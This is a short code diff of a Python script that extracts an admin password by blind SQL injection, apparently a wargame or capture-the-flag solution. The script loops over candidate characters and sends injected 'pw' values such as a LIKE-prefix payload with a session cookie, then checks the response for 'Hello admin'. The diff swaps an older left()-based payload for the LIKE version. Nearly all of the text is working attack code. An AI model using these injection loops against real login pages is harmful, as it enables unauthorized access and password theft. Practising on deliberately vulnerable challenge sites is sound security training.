@@ -24,10 +24,19 @@ for i in range(100):
         pw_length = i
         break
 
+# for i in range(pw_length):
+#     for j in a:
+#         res = requests.get(base_url, params={
+#             'pw': f"' || left(pw,{i + 1}) like '{pw + j}"
+#         }, cookies=cookie).text
+#         if "Hello admin" in res:
+#             print(f"pw[{i}] == {j}")
+#             pw += j
+#             break
 for i in range(pw_length):
     for j in a:
         res = requests.get(base_url, params={
-            'pw': f"' || left(pw,{i + 1}) like '{pw + j}"
+            'pw': f"' || pw like '{pw + j}%"
         }, cookies=cookie).text
         if "Hello admin" in res:
             print(f"pw[{i}] == {j}")
